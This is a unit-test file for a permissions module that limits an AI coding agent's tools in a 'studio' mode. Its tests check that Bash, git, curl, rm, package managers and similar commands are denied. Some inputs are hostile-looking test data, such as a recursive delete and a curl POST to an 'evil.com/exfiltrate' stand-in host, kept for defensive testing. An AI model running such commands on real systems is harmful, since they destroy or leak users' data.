/**
 * Unit tests for studio/apps/server/src/permissions.ts
 *
 * Issue #25 test plan items covered:
 *   - Unit test: tool filter strips git, gh, rm, and network tools from the
 *     tool list passed to Claude in studio mode
 *   - Unit test: tool filter preserves Read, Edit, and studio-exposed build tools
 *   - Negative test: attempt file deletion via Bash tool and confirm denial
 *   - Negative test: attempt outbound HTTP via Bash tool and confirm denial
 */

import { describe, it, expect } from "vitest";
import {
  ALLOWED_TOOLS,
  DENIED_BASH_PATTERNS,
  filterTools,
  isToolAllowed,
  getAllowedTools,
  validateBashCommand,
  extractCommandBinaries,
  buildPermissionDeniedMessage,
  buildAllowedToolsFlag,
  STUDIO_PERMISSION_PROMPT_ADDENDUM,
  getAllowedToolsForMode,
  isToolAllowedForMode,
} from "../../src/permissions";

// ── ALLOWED_TOOLS constant ───────────────────────────────────────────────────

describe("ALLOWED_TOOLS", () => {
  it("includes Read tool", () => {
    expect(ALLOWED_TOOLS).toContain("Read");
  });

  it("includes Edit tool", () => {
    expect(ALLOWED_TOOLS).toContain("Edit");
  });

  it("includes Write tool", () => {
    expect(ALLOWED_TOOLS).toContain("Write");
  });

  it("includes Glob tool", () => {
    expect(ALLOWED_TOOLS).toContain("Glob");
  });

  it("includes Grep tool", () => {
    expect(ALLOWED_TOOLS).toContain("Grep");
  });

  it("does not include Bash tool", () => {
    expect(ALLOWED_TOOLS).not.toContain("Bash");
  });

  it("does not include git-related tools", () => {
    expect(ALLOWED_TOOLS).not.toContain("git");
    expect(ALLOWED_TOOLS).not.toContain("gh");
  });
});

// ── filterTools ──────────────────────────────────────────────────────────────

describe("filterTools", () => {
  it("strips git, gh, rm, and network tools from the tool list", () => {
    const fullToolList = [
      "Read",
      "Edit",
      "Write",
      "Bash",
      "Glob",
      "Grep",
      "git",
      "gh",
      "rm",
      "curl",
      "wget",
    ];
    const filtered = filterTools(fullToolList);

    expect(filtered).toContain("Read");
    expect(filtered).toContain("Edit");
    expect(filtered).toContain("Write");
    expect(filtered).toContain("Glob");
    expect(filtered).toContain("Grep");
    expect(filtered).not.toContain("Bash");
    expect(filtered).not.toContain("git");
    expect(filtered).not.toContain("gh");
    expect(filtered).not.toContain("rm");
    expect(filtered).not.toContain("curl");
    expect(filtered).not.toContain("wget");
  });

  it("preserves Read, Edit, and studio-exposed build tools", () => {
    const tools = ["Read", "Edit", "Write", "Glob", "Grep", "Bash", "WebFetch"];
    const filtered = filterTools(tools);

    expect(filtered).toEqual(["Read", "Edit", "Write", "Glob", "Grep"]);
  });

  it("returns empty array when no tools are allowed", () => {
    const tools = ["Bash", "git", "gh", "Docker"];
    const filtered = filterTools(tools);
    expect(filtered).toEqual([]);
  });

  it("handles empty input", () => {
    expect(filterTools([])).toEqual([]);
  });

  it("handles input with only allowed tools", () => {
    const tools = ["Read", "Edit"];
    expect(filterTools(tools)).toEqual(["Read", "Edit"]);
  });
});

// ── isToolAllowed ────────────────────────────────────────────────────────────

describe("isToolAllowed", () => {
  it("returns true for Read", () => {
    expect(isToolAllowed("Read")).toBe(true);
  });

  it("returns true for Edit", () => {
    expect(isToolAllowed("Edit")).toBe(true);
  });

  it("returns false for Bash", () => {
    expect(isToolAllowed("Bash")).toBe(false);
  });

  it("returns false for git", () => {
    expect(isToolAllowed("git")).toBe(false);
  });

  it("returns false for arbitrary unknown tools", () => {
    expect(isToolAllowed("SomeRandomTool")).toBe(false);
  });
});

// ── getAllowedTools ──────────────────────────────────────────────────────────

describe("getAllowedTools", () => {
  it("returns a copy of the allowed tools array", () => {
    const tools = getAllowedTools();
    expect(tools).toEqual([...ALLOWED_TOOLS]);
    // Verify it is a copy, not the original
    tools.push("Bash");
    expect(ALLOWED_TOOLS).not.toContain("Bash");
  });
});

// ── extractCommandBinaries ───────────────────────────────────────────────────

describe("extractCommandBinaries", () => {
  it("extracts binary from simple command", () => {
    expect(extractCommandBinaries("ls -la")).toContain("ls");
  });

  it("extracts binaries from piped commands", () => {
    const binaries = extractCommandBinaries("cat foo.txt | grep bar");
    expect(binaries).toContain("cat");
    expect(binaries).toContain("grep");
  });

  it("extracts binaries from chained commands (&&)", () => {
    const binaries = extractCommandBinaries("cd /tmp && rm -rf .");
    expect(binaries).toContain("cd");
    expect(binaries).toContain("rm");
  });

  it("extracts binaries from semicolon-separated commands", () => {
    const binaries = extractCommandBinaries("echo hello; git status");
    expect(binaries).toContain("echo");
    expect(binaries).toContain("git");
  });

  it("extracts binaries from subshell expressions", () => {
    const binaries = extractCommandBinaries("echo $(git rev-parse HEAD)");
    expect(binaries).toContain("echo");
    expect(binaries).toContain("git");
  });

  it("strips env variable prefixes", () => {
    const binaries = extractCommandBinaries("FOO=bar git status");
    expect(binaries).toContain("git");
  });

  it("returns empty array for empty input", () => {
    expect(extractCommandBinaries("")).toEqual([]);
  });
});

// ── validateBashCommand ──────────────────────────────────────────────────────

describe("validateBashCommand", () => {
  // ── Denied: git commands ───────────────────────────────────────────────

  it("denies git status", () => {
    const result = validateBashCommand("git status");
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("git");
    expect(result.reason).toContain("not permitted");
  });

  it("denies git commit", () => {
    const result = validateBashCommand('git commit -m "test"');
    expect(result.allowed).toBe(false);
  });

  it("denies git push", () => {
    const result = validateBashCommand("git push origin main");
    expect(result.allowed).toBe(false);
  });

  it("denies git in a pipeline", () => {
    const result = validateBashCommand("echo test | git hash-object --stdin");
    expect(result.allowed).toBe(false);
  });

  it("denies git in a subshell", () => {
    const result = validateBashCommand("echo $(git rev-parse HEAD)");
    expect(result.allowed).toBe(false);
  });

  it("denies git with absolute path", () => {
    const result = validateBashCommand("/usr/bin/git status");
    expect(result.allowed).toBe(false);
  });

  // ── Denied: gh CLI ────────────────────────────────────────────────────

  it("denies gh CLI", () => {
    const result = validateBashCommand("gh pr list");
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("gh");
  });

  // ── Denied: file deletion ─────────────────────────────────────────────

  it("denies rm command", () => {
    const result = validateBashCommand("rm -rf /tmp/test");
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("rm");
  });

  it("denies rmdir command", () => {
    const result = validateBashCommand("rmdir /tmp/test");
    expect(result.allowed).toBe(false);
  });

  it("denies unlink command", () => {
    const result = validateBashCommand("unlink /tmp/test.txt");
    expect(result.allowed).toBe(false);
  });

  // ── Denied: package managers ──────────────────────────────────────────

  it("denies npm install", () => {
    const result = validateBashCommand("npm install express");
    expect(result.allowed).toBe(false);
  });

  it("denies yarn add", () => {
    const result = validateBashCommand("yarn add lodash");
    expect(result.allowed).toBe(false);
  });

  it("denies pnpm install", () => {
    const result = validateBashCommand("pnpm install");
    expect(result.allowed).toBe(false);
  });

  it("denies bun install", () => {
    const result = validateBashCommand("bun install");
    expect(result.allowed).toBe(false);
  });

  it("denies bun add", () => {
    const result = validateBashCommand("bun add express");
    expect(result.allowed).toBe(false);
  });

  it("denies bun remove", () => {
    const result = validateBashCommand("bun remove express");
    expect(result.allowed).toBe(false);
  });

  // ── Denied: outbound HTTP / network ───────────────────────────────────

  it("denies curl", () => {
    const result = validateBashCommand("curl https://example.com");
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("curl");
  });

  it("denies wget", () => {
    const result = validateBashCommand("wget https://example.com/file.tar.gz");
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("wget");
  });

  it("denies ssh", () => {
    const result = validateBashCommand("ssh user@host");
    expect(result.allowed).toBe(false);
  });

  // ── Denied: system utilities ──────────────────────────────────────────

  it("denies sudo", () => {
    const result = validateBashCommand("sudo apt update");
    expect(result.allowed).toBe(false);
  });

  it("denies docker", () => {
    const result = validateBashCommand("docker ps");
    expect(result.allowed).toBe(false);
  });

  it("denies kubectl", () => {
    const result = validateBashCommand("kubectl get pods");
    expect(result.allowed).toBe(false);
  });

  it("denies chmod", () => {
    const result = validateBashCommand("chmod 777 /tmp/test");
    expect(result.allowed).toBe(false);
  });

  // ── Allowed: safe read-only commands ──────────────────────────────────

  it("allows empty command", () => {
    const result = validateBashCommand("");
    expect(result.allowed).toBe(true);
  });

  it("allows cat command", () => {
    const result = validateBashCommand("cat package.json");
    expect(result.allowed).toBe(true);
  });

  it("allows ls command", () => {
    const result = validateBashCommand("ls -la src/");
    expect(result.allowed).toBe(true);
  });

  it("allows head command", () => {
    const result = validateBashCommand("head -n 20 src/index.ts");
    expect(result.allowed).toBe(true);
  });

  it("allows echo command", () => {
    const result = validateBashCommand("echo hello");
    expect(result.allowed).toBe(true);
  });

  // ── Denied: chained commands with denied binary ───────────────────────

  it("denies chained command when second part is git", () => {
    const result = validateBashCommand("echo hello && git status");
    expect(result.allowed).toBe(false);
  });

  it("denies chained command with rm", () => {
    const result = validateBashCommand("ls /tmp && rm -rf /tmp/test");
    expect(result.allowed).toBe(false);
  });
});

// ── buildPermissionDeniedMessage ─────────────────────────────────────────────

describe("buildPermissionDeniedMessage", () => {
  it("includes the tool name in the denial message", () => {
    const msg = buildPermissionDeniedMessage("Bash");
    expect(msg).toContain("Bash");
    expect(msg).toContain("Studio Permission Denied");
  });

  it("includes detail when provided", () => {
    const msg = buildPermissionDeniedMessage(
      "git",
      "Git is blocked in studio mode",
    );
    expect(msg).toContain("Git is blocked in studio mode");
  });

  it("omits detail line when not provided", () => {
    const msg = buildPermissionDeniedMessage("Bash");
    expect(msg).not.toContain("Reason:");
  });

  it("includes explanation of studio restrictions", () => {
    const msg = buildPermissionDeniedMessage("Bash");
    expect(msg).toContain("harness level");
  });
});

// ── buildAllowedToolsFlag ────────────────────────────────────────────────────

describe("buildAllowedToolsFlag", () => {
  it("returns a comma-separated string of allowed tools", () => {
    const flag = buildAllowedToolsFlag();
    expect(flag).toBe("Read,Edit,Write,Glob,Grep");
  });

  it("does not include Bash in the flag value", () => {
    const flag = buildAllowedToolsFlag();
    expect(flag).not.toContain("Bash");
  });
});

// ── STUDIO_PERMISSION_PROMPT_ADDENDUM ────────────────────────────────────────

describe("STUDIO_PERMISSION_PROMPT_ADDENDUM", () => {
  it("is a non-empty string", () => {
    expect(typeof STUDIO_PERMISSION_PROMPT_ADDENDUM).toBe("string");
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM.length).toBeGreaterThan(0);
  });

  it("mentions allowed operations", () => {
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM).toContain("Read");
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM).toContain("Edit");
  });

  it("mentions denied operations", () => {
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM).toContain("Git");
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM).toContain("deletion");
    expect(STUDIO_PERMISSION_PROMPT_ADDENDUM).toContain("Package managers");
  });
});

// ── DENIED_BASH_PATTERNS constant ────────────────────────────────────────────

describe("DENIED_BASH_PATTERNS", () => {
  it("includes git", () => {
    expect(DENIED_BASH_PATTERNS).toContain("git");
  });

  it("includes gh", () => {
    expect(DENIED_BASH_PATTERNS).toContain("gh");
  });

  it("includes rm", () => {
    expect(DENIED_BASH_PATTERNS).toContain("rm");
  });

  it("includes curl", () => {
    expect(DENIED_BASH_PATTERNS).toContain("curl");
  });

  it("includes wget", () => {
    expect(DENIED_BASH_PATTERNS).toContain("wget");
  });

  it("includes npm", () => {
    expect(DENIED_BASH_PATTERNS).toContain("npm");
  });

  it("includes a regex pattern for bun install/add/remove", () => {
    const hasRegex = DENIED_BASH_PATTERNS.some((p) => p instanceof RegExp);
    expect(hasRegex).toBe(true);
  });
});

// ── Negative-path tests ──────────────────────────────────────────────────────
//
// Per issue #23 convention: each test file includes negative-path cases.

describe("permissions — negative paths", () => {
  it("validateBashCommand returns clear denial for file deletion attempt", () => {
    const result = validateBashCommand("rm -rf /important/data");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBeTruthy();
    expect(result.reason).toContain("not permitted");
  });

  it("validateBashCommand returns clear denial for outbound HTTP attempt", () => {
    const result = validateBashCommand(
      "curl -X POST https://evil.com/exfiltrate",
    );
    expect(result.allowed).toBe(false);
    expect(result.reason).toBeTruthy();
    expect(result.reason).toContain("not permitted");
  });

  it("filterTools handles duplicate tool names gracefully", () => {
    const tools = ["Read", "Read", "Edit", "Edit", "Bash"];
    const filtered = filterTools(tools);
    expect(filtered).toEqual(["Read", "Read", "Edit", "Edit"]);
  });

  it("buildPermissionDeniedMessage handles empty tool name", () => {
    const msg = buildPermissionDeniedMessage("");
    expect(msg).toContain("Studio Permission Denied");
  });
});

// ── Mode-aware tool filtering (Issue #27) ────────────────────────────────────

describe("getAllowedToolsForMode", () => {
  it("returns full tool set for design mode", () => {
    const tools = getAllowedToolsForMode("design");
    expect(tools).toContain("Read");
    expect(tools).toContain("Edit");
    expect(tools).toContain("Write");
    expect(tools).toContain("Glob");
    expect(tools).toContain("Grep");
  });

  it("returns read-only tools for question mode", () => {
    const tools = getAllowedToolsForMode("question");
    expect(tools).toContain("Read");
    expect(tools).toContain("Glob");
    expect(tools).toContain("Grep");
    expect(tools).not.toContain("Edit");
    expect(tools).not.toContain("Write");
  });

  it("defaults to design mode when no mode specified", () => {
    const tools = getAllowedToolsForMode();
    expect(tools).toContain("Edit");
    expect(tools).toContain("Write");
  });
});

describe("isToolAllowedForMode", () => {
  it("allows Edit in design mode", () => {
    expect(isToolAllowedForMode("Edit", "design")).toBe(true);
  });

  it("rejects Edit in question mode", () => {
    expect(isToolAllowedForMode("Edit", "question")).toBe(false);
  });

  it("rejects Write in question mode", () => {
    expect(isToolAllowedForMode("Write", "question")).toBe(false);
  });

  it("allows Read in question mode", () => {
    expect(isToolAllowedForMode("Read", "question")).toBe(true);
  });

  it("allows Glob in question mode", () => {
    expect(isToolAllowedForMode("Glob", "question")).toBe(true);
  });

  it("allows Grep in question mode", () => {
    expect(isToolAllowedForMode("Grep", "question")).toBe(true);
  });

  it("rejects Bash in both modes", () => {
    expect(isToolAllowedForMode("Bash", "design")).toBe(false);
    expect(isToolAllowedForMode("Bash", "question")).toBe(false);
  });
});

describe("buildAllowedToolsFlag — mode-aware", () => {
  it("returns full tool set flag for design mode", () => {
    const flag = buildAllowedToolsFlag("design");
    expect(flag).toBe("Read,Edit,Write,Glob,Grep");
  });

  it("returns read-only tool set flag for question mode", () => {
    const flag = buildAllowedToolsFlag("question");
    expect(flag).toBe("Read,Glob,Grep");
  });

  it("defaults to design mode", () => {
    const flag = buildAllowedToolsFlag();
    expect(flag).toBe("Read,Edit,Write,Glob,Grep");
  });
});
